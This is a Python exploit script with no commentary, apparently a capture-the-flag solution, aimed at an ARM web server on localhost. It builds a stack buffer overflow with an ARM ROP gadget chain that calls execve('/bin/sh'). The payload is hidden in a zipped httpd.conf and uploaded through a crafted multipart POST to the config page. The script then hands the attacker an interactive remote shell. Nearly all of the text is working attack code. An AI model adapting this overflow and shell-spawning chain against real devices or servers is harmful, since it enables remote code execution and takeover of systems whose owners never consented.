from pwn import *
import telnetlib
import socket
import os
import time

def main():
        context.arch = 'arm'
        payload = "A" * (512 + 12)

        pop_r0_pc = 0x00084574 # 0x00084574: pop {r0, pc};
        pop_r1_pc = 0x000849ec # 0x000849ec: pop {r1, pc};
        mov_r3_r7_blx_r4 = 0x00063fb4 # 0x00063fb4: mov r3, r7; blx r4;
        mov_r2_r4_blx_r3 = 0x0005ba68 #0x0005ba68: mov r2, r4; blx r3;
        mov_r0_r4_pop_r4_pc = 0x00057b18 # 0x00057b18: mov r0, r4; pop {r4, pc};
        pop_r4_r5_r6_r7_pc = 0x00025cd0 # 0x00025cd0: pop {r4, r5, r6, r7, pc};
        syscall_pop_r4_r5_r6_r7_pc = 0x00033af8 # 0x00033af8: svc #0; pop {r4, r5, r6, r7, pc};

        def syscall(r0, r1, r2, r7):
                data = ""
                return_hax = pop_r0_pc

                # set our syscall (r7)
                data += p32(pop_r4_r5_r6_r7_pc)
                data += p32(pop_r4_r5_r6_r7_pc) #r4
                data += p32(0x41414141) #r5
                data += p32(0x41414141) #r6
                data += p32(return_hax) #r7

                #move r7 to r3, jump to r4
                data += p32(mov_r3_r7_blx_r4)

                data += p32(r2) #r4
                data += p32(0x41414141) #r5
                data += p32(0x41414141) #r6
                data += p32(r7) #r7

                #now we finally get control of r2, jump to r3
                data += p32(mov_r2_r4_blx_r3)

                # we now get r0 and r1 trivially
                data += p32(r0)
                data += p32(pop_r1_pc)
                data += p32(r1)

                data += p32(syscall_pop_r4_r5_r6_r7_pc)
                data += p32(0x42424242) * 4 #junk
                return data

        target = "http://localhost:5555/page?=conf"

        shell = "/bin/sh\x00"
        shell_addr = 0xbbefc+209

        payload += syscall(shell_addr,0,0,0xb)
        payload += p32(0x13371337)

        with open('httpd.conf', 'w') as f:
                f.write(payload)
        print "[~] wrote payload to httpd.conf"

        os.system('zip hax.zip httpd.conf')
        time.sleep(1)
        zip_size = os.path.getsize("hax.zip")
        if zip_size > 512:
                print "[-] zip to large :("

        print "[~] created zip (%d bytes)" % zip_size
        print "[+] sending zip..."

        zip_content = open("hax.zip", "rb").read()

        http_data = ("""POST /page?=conf HTTP/1.1
Host: localhost:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:5555/page?=conf
Content-Type: multipart/form-data; boundary=---------------------------5771687113221876781020449823
Content-Length: {0}
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------5771687113221876781020449823
Content-Disposition: form-data; name="config"; filename="{1}"
Content-Type: application/zip

""").format(zip_size, shell).replace("\n", "\r\n")

        http_data += "{0}\r\n-----------------------------5771687113221876781020449823--".format(zip_content)

        print "[~] Now, try to write some commands ;)"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("localhost", 5555))
        s.send(http_data)
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()

if __name__ == "__main__":
        main()
